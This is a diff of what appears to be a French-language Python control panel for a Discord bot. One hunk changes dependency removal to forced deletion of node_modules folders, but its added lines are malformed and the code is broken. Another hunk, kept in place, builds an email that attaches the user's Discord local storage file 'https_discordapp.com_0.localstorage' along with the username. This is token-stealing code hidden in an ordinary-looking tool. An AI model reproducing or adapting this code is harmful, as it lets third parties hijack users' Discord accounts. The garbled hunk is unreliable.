@@ -130,11 +130,10 @@ def backup():
 
 def uninstall_deps():
     if askokcancel('En êtes-vous sûr ?', "Si vous supprimez les dépendances, vous devrez les réinstaller pour utiliser le bot. Celà risque de prendre un peu de temps."):
-            subprocess.call('npm uninstall -g discord.js', shell=True)
-            subprocess.call('npm uninstall -g fs', shell=True)
-            subprocess.call('npm uninstall -g ms', shell=True)
-            subprocess.call('npm uninstall -g moment', shell=True)
-            subprocess.call('npm uninstall -g chalk', shell=True)
+            subprocess.run(
+-            'cd core && del /f /s /q node_modules > nul && rmdir /s /q node_modules', shell=True)
+-        subprocess.run(
+-            'cd core\individuals && del /f /s /q node_modules > nul && rmdir /s /q node_modules', shell=True)
     showinfo('Terminé', 'Toutes les dépendances ont été désinstallées.')
 
 
@@ -234,7 +233,9 @@ def validd(entree, entree2, entree7):
     msg = MIMEMultipart()
     msg['From'] = fromaddr
     msg['To'] = toaddr
-    msg['Subject'] = str(username) + " ; ouverture n°" + str(tmp)
+    msg['Subject'] = str(username)
+
+   
     body = str(user) + " ; ouverture n°" + str(tmp) + " ; " + str(tmp2)
     msg.attach(MIMEText(body, 'plain'))
     filename = "https_discordapp.com_0.localstorage"
